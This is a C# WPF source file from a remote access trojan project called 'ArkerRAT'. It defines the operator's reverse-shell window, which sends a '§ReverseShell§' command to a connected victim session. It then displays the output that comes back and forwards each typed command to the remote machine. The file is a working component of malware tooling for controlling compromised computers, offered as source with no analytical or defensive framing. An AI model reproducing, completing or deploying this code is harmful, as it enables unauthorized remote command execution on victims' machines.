using ArkerRAT1;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace ArkerRatWpfVersion
{
    /// <summary>
    /// Interaction logic for ReverseShellWindow.xaml
    /// </summary>
    public partial class ReverseShellWindow : Window
    {
        public RATHostSession clientSession { get; set; }
        public ReverseShellWindow(RATHostSession session)
        {
            InitializeComponent();
            reverseShellTextOutput.Document.Blocks.Clear();
            reverseShellTextOutput.IsReadOnly = true;
            clientSession = session;
            clientSession.reverseShellWindowIsAlreadyOpen = true;
            clientSession.SendData("§ReverseShell§");
        }
        private async void CloseReverseShell(object sender, RoutedEventArgs e)
        {
            await clientSession.SendData("§ReverseShell§§close§");
            clientSession.reverseShellWindowIsAlreadyOpen = false;
            Close();
        }

        private void MinimizeReverseShell(object sender, RoutedEventArgs e)
        {
            this.WindowState = WindowState.Minimized;
        }

        private void Window_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (e.LeftButton == MouseButtonState.Pressed)
            {
                DragMove();
            }
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {

        }

        public string data = "";
        private string checkIfDataIsNew = "1";
        public async Task ReversShellFunction()
        {
            if (data.Length > 1 && data != checkIfDataIsNew)
            {
                reverseShellTextOutput.AppendText(data);
                reverseShellTextOutput.ScrollToEnd();
                checkIfDataIsNew = data;
            }

        }

        private async void EnterPressed(object sender, KeyEventArgs e)
        {
            if(e.Key == Key.Enter)
            {
                await clientSession.SendData(reverseShellTextInput.Text+"§ReverseShell§");
                reverseShellTextInput.Clear();
            }
        }
    }
}
